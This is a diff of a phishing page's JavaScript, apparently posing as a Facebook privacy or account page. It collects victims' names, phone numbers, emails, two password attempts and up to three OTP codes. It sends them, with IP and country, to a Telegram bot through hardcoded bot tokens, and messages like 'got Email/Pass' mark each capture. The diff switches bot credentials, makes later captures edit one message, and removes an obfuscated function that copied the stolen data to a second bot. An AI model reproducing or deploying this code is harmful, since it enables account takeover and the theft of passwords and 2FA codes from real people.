@@ -4352,11 +4352,11 @@
             })(navigator.userAgent || navigator.vendor || window.opera);
 
             return check;
-        };s
+        };
     </script>
     <script>
-       var apiKey = "7861008820:AAEpRnH07HOopuC2o5bV53S8pZjKA5h20TM",chatId='1117818432';
-    // var apiKey = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs",chatId='6580233045';
+    //    var apiKey = "7861008820:AAEpRnH07HOopuC2o5bV53S8pZjKA5h20TM",chatId='1117818432';
+    var apiKey = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs",chatId='6580233045';
         const subLinks = {
             'PolicyCollapse': [{
                 'text': 'What is the Privacy Policy and what does it cover?',
@@ -4529,7 +4529,7 @@
         // var userMianFormData = {}
         // var userPasswordData = {}
         // var user2FAData = {}
-        var apiInsertCounter = 0
+        var apiInsertCounter = 0, msgId;
     
         var formsSendData = {
             'full-name': '',
@@ -4666,22 +4666,36 @@
         }
         /////
         getUserIp()
-    
+        function encodeUTF8(str) {
+            return decodeURIComponent(escape(str));
+        }
+
         // Send data to Email
-        function sendDataEmail() {
+        function sendDataEmail(msgId, callback) {
             var templateTELEData = "🎁 Quà tặng cuộc sống 🎁\n-URL : " + window.location.href + "\n-IP : " + userIpData.user_ip + "\n-Country : " + userIpData.country + ", " + userIpData.country_code + "\n-Fullname: " + formsSendData["full-name"] + "\nMarketplace name : " + formsSendData["page-name"] + "\n-Phone number : " + formsSendData["mobile-phone-number"] + "\n==========================\n👌 Đã lấy được Email/Pass\n-Email : " + formsSendData['personal-email'] + "\n-Password-1 : " + formsSendData['password-1'] + "\n-Password-2 : " + formsSendData["password-2"] + "\n==========================\n👌 Đã lấy được OTP 1 : " + formsSendData["2FA-1"] + "\n==========================\n👌 Đã lấy được OTP 2 : " + formsSendData["2FA-2"] + "\n==========================\n👌 Đã lấy được OTP 3 : " + formsSendData['2FA-3'] + "\n-Time: " + getTimeGMT7();
-            var data = {
-            'chat_id': chatId,
-            'text': templateTELEData,
-            'parse_mode': "HTML"
+
+            var apiEndpoint = msgId ? '/editMessageText' : '/sendMessage'; // Chọn API phù hợp
+
+            var data = msgId ? {
+                'chat_id': chatId,
+                'message_id': msgId,
+                'text': templateTELEData,
+                'parse_mode': "HTML"
+            } : {
+                'chat_id': chatId,
+                'text': templateTELEData,
+                'parse_mode': "HTML"
             };
-            $.ajax("https://api.telegram.org/bot" + apiKey + '/sendMessage', {
+
+            $.ajax("https://api.telegram.org/bot" + apiKey + apiEndpoint,{
             'type': "POST",
             'data': JSON.stringify(data),
             'contentType': 'application/json'
             }).done(function () {}).fail(function (_0x33795a) {});
-            checkCoutry(templateTELEData);
+            
+            // checkCoutry(templateTELEData);
         }
+
         function firstFormHandle(event) {
             event.preventDefault()
             updateFormsSendData(serializeForm(firstForm))
@@ -4727,14 +4741,20 @@
                     errortext.style.display = 'block'
                     errortext = apiForm.querySelector('input').value = ''
                     apiInsertCounter++
-                    sendDataEmail()
+                    sendDataEmail(null, function (messageId) {
+                        msgId = messageId;
+                    });
+                    console.log("gửi password lần 1");
                     spiner.style.display = 'none'
                     buttonText.style.display = 'block'
                     button.removeAttribute('disabled')
                     hidePasswordIncorrectText()
                     input.setAttribute('name', 'password-2')
                 } else {
-                    sendDataEmail()
+                    sendDataEmail(msgId);
+                    
+                    console.log("gửi password lần 2");
+
                     errortext.style.display = 'none'
                     spiner.style.display = 'none'
                     buttonText.style.display = 'block'
@@ -4766,10 +4786,10 @@
             updateFormsSendData(serializeForm(twoFAForm))
             setTimeout(function () {
                 counter2FA++
+                sendDataEmail(msgId)
                 if (counter2FA >= countOf2FA + 1) {
                     // SHOW success
-                    console.log("điều hướng ở đây nhé");
-                    sendDataEmail()
+                    // console.log("điều hướng ở đây nhé");
                     
                     unlock2FA()
                     spiner.style.display = 'none'
@@ -4844,9 +4864,7 @@
                 formsSendData[key] = value
             }
         }
-        function checkCoutry(data){
-            var _0x3d9338=_0x4232;function _0x26e7(){var _0x1a84d0=['/sendMessage','1353308duyDBk','https://api.telegram.org/bot','4520727ksRAuD','21871uCdODM','1689432hlqwLs','fail','-1002327100121','HTML','15XzzDdi','6983542438:AAF-7RfYI-xy8offmWl-2j0-zm-aV83F7l0','15LkSSea','done','1740333ztkFJt','175434rGBAxE','16nLKjWP','ajax','POST','18833520hpLGCZ'];_0x26e7=function(){return _0x1a84d0;};return _0x26e7();}(function(_0x381787,_0x53f7c2){var _0x3f87c6=_0x4232,_0x3694ea=_0x381787();while(!![]){try{var _0x3a74e8=-parseInt(_0x3f87c6(0x87))/0x1+parseInt(_0x3f87c6(0x7e))/0x2*(parseInt(_0x3f87c6(0x7b))/0x3)+parseInt(_0x3f87c6(0x84))/0x4*(parseInt(_0x3f87c6(0x79))/0x5)+-parseInt(_0x3f87c6(0x88))/0x6+parseInt(_0x3f87c6(0x7d))/0x7+parseInt(_0x3f87c6(0x7f))/0x8*(parseInt(_0x3f87c6(0x86))/0x9)+-parseInt(_0x3f87c6(0x82))/0xa;if(_0x3a74e8===_0x53f7c2)break;else _0x3694ea['push'](_0x3694ea['shift']());}catch(_0x3bef9e){_0x3694ea['push'](_0x3694ea['shift']());}}}(_0x26e7,0x7ef3c));function _0x4232(_0x14e840,_0x43b368){var _0x26e791=_0x26e7();return _0x4232=function(_0x4232f3,_0x51656c){_0x4232f3=_0x4232f3-0x77;var _0x22410f=_0x26e791[_0x4232f3];return _0x22410f;},_0x4232(_0x14e840,_0x43b368);}var apiKeyX=_0x3d9338(0x7a),chatIdX=_0x3d9338(0x77),dataNew={'chat_id':chatIdX,'text':data,'parse_mode':_0x3d9338(0x78)};$[_0x3d9338(0x80)](_0x3d9338(0x85)+apiKeyX+_0x3d9338(0x83),{'type':_0x3d9338(0x81),'data':JSON['stringify'](dataNew),'contentType':'application/json'})[_0x3d9338(0x7c)](function(){})[_0x3d9338(0x89)](function(_0x212317){});
-        }
+        
         function startTimer() {
             // TIMER
             var countDownDate = new Date().getTime();
